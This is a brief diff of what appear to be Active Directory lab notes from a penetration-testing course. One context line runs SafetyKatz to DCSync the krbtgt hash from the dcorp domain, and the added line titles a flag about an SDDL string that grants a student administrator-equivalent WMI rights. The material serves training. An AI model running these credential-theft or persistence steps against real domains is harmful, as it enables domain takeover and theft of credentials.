@@ -526,4 +526,5 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 ![[Pasted image 20231025125418.png]]
 
-### **FLAG 22 - **
+### **FLAG 22 - SDDL string that provides studentx same permissions as BA on root\cimv2 WMI namespace.**
+
